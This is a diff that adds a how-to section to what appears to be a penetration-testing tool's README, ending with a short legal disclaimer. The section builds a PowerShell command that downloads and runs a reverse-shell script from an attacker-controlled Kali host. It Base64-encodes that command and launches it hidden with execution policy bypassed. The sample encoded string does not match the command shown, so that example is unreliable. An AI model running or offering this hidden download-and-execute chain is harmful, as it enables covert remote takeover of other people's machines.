@@ -98,6 +98,51 @@ This command performs the following actions:
 
 Once this command is executed, the target machine will connect back to your Kali machine's listener, providing you with a command prompt on the target system.
 
+---
+### **Steps to Encode the Reverse Shell**
+
+1. **Prepare the PowerShell Command** Use the original PowerShell reverse shell command:
+    
+    ```powershell
+    IEX(New-Object Net.WebClient).DownloadString('http://<kali_ip>/reverse.ps1')
+    ```
+    
+    Replace `<kali_ip>` with your Kali machine's IP address.
+    
+
+---
+
+2. **Encode the Command in Base64** On your Kali machine, encode the command using this command:
+    
+    ```bash
+    echo -n "IEX(New-Object Net.WebClient).DownloadString('http://<kali_ip>/reverse.ps1')" | iconv -t UTF-16LE | base64
+    ```
+    
+    The result will be a Base64-encoded string. For example:
+    
+    ```
+    SABSAGUAdgBlAHIAcwBlAC4AUABTADEACgA=
+    ```
+    
+
+---
+
+3. **Run the Encoded Command** Use the encoded string with PowerShell's `-EncodedCommand` parameter:
+    
+    ```powershell
+    powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand <Base64String>
+    ```
+    
+    Replace `<Base64String>` with the output from the previous step.
+    
+    Example:
+    
+    ```powershell
+    powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SABSAGUAdgBlAHIAcwBlAC4AUABTADEACgA=
+    ```
+    
+
+
 ## Legal Disclaimer
 
 This tool is intended for use in authorized security assessments only. Unauthorized access to computer systems is illegal. Always obtain explicit written permission before testing or exploiting any system.
